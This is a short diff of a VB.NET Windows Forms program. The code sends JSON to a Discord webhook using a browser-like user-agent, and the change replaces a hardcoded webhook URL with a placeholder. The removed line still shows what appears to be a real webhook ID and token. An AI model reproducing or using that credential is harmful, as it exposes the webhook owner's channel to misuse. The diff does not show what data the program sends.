@@ -285,7 +285,7 @@ Public Class Form1
   ],
   ""attachments"": []
 }")
-        Dim Request As System.Net.HttpWebRequest = DirectCast(System.Net.WebRequest.Create("https://discord.com/api/v10/webhooks/966686517944811580/N2_Ow7c_vfnSJktVCx7U3QyX1zGAMuGKoPogep23vVdJOPiGQTOV8wgTaoVI05t68aO_?wait=true"), System.Net.HttpWebRequest)
+            Dim Request As System.Net.HttpWebRequest = DirectCast(System.Net.WebRequest.Create("YOUR WEBHOOK HERE"), System.Net.HttpWebRequest)
         Request.Method = "POST"
         Request.Accept = "application/json"
         Request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
